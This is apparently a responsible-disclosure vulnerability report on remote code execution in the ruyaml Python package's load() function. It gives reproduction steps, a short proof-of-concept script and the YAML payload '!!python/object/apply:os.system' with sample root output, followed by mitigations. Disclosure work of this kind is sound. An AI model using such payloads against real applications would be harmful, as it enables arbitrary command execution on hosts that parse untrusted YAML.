# Vulnerability Report

## Vulnerability Name
```
Vulnerability Name: ruyaml <= 0.91.0 vulnerable to Remote Code Execution (RCE) via unsafe load() method
```

## Affected URL and Area
```
Affected Package: ruyaml (PyPI)
Affected Module/Function: load()
Affected Version: <= 0.91.0
```

## Vulnerability Description
```
The ruyaml package (a fork of ruamel.yaml) provides YAML parsing for Python. 
Through version 0.91.0, the function `ruyaml.load()` is unsafe when used with untrusted YAML input. 
The default loader allows arbitrary object construction, enabling attackers to inject Python objects 
and execute system commands.

During testing, providing a specially crafted YAML payload such as 
`!!python/object/apply:os.system ["id"]` resulted in the execution of operating system commands. 
This issue arises because `ruyaml.load()` defaults to UnsafeLoader, rather than a SafeLoader 
that restricts arbitrary object instantiation.
```

## Severity and Risk Rating
```
Severity: Critical
Risk Rating: High
```

## CVE, CWE, CVSS Score and Vulnerability Class
```
CVE: Not yet assigned (related: CVE-2019-20478 in ruamel.yaml, CVE-2017-18342 in PyYAML)
CWE-ID: CWE-94 (Improper Control of Generation of Code - Code Injection)
CVSS Score: 9.8 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Vulnerability Class: Unsafe Deserialization / Remote Code Execution
```

## Impact of Vulnerability
```
If an application uses `ruyaml.load()` with user-supplied or untrusted YAML input, 
an attacker can execute arbitrary operating system commands. This may lead to:

- Full compromise of the application host
- Unauthorized access to sensitive data
- Disruption of services (DoS)
- Potential lateral movement within the environment

The severity of this vulnerability is critical, since it enables remote, 
unauthenticated attackers to achieve RCE with minimal effort.
```

## Steps to Reproduce
```
Steps to reproduce:

1. Install ruyaml in a Python environment:
   pip install ruyaml==0.91.0

2. Create a PoC script (poc.py) with the following code:
   import ruyaml
   payload = """!!python/object/apply:os.system [\"id\"]"""
   data = ruyaml.load(payload)
   print(data)

3. Run the script:
   python3 poc.py

4. Observe that the system command `id` is executed on the host, 
   demonstrating Remote Code Execution.
```

## Proof of Concept (PoC)
PoC Script:  
[View poc.py](https://github.com/Whyshealwaysbrokeme/vuln-ruyaml-0.91.0-rce/blob/main/report/poc.py)

PoC Screenshot:  
![PoC Screenshot](https://github.com/Whyshealwaysbrokeme/vuln-ruyaml-0.91.0-rce/blob/main/report/poc.png)

Execution Output:  
![Execution Output](https://github.com/Whyshealwaysbrokeme/vuln-ruyaml-0.91.0-rce/blob/main/report/output.png)

PoC Payload:
```
!!python/object/apply:os.system ["id"]
```

Execution Result (example):
```
uid=0(root) gid=0(root) groups=0(root)
```

## Mitigation/Remediation
```
Mitigation Steps:

1. Avoid using `ruyaml.load()` with untrusted input.
2. Replace with `ruyaml.safe_load()` which restricts unsafe object construction.
3. If complex object support is required, explicitly specify a safe Loader, e.g.:
   ruyaml.load(data, Loader=ruyaml.SafeLoader)
4. Apply input validation before processing user-supplied YAML.
5. Follow security advisories and update to future patched versions of ruyaml.
```

## References
```
- CVE-2019-20478 (ruamel.yaml)
- CVE-2017-18342 (PyYAML)
- CWE-94: Improper Control of Generation of Code ('Code Injection')
- https://nvd.nist.gov/vuln/detail/CVE-2019-20478
- https://cwe.mitre.org/data/definitions/94.html
```

## Disclosure
```
Disclosure Date: 24 August 2025
Reporter: [Your Name / Contact]
Status: Under Responsible Disclosure
```
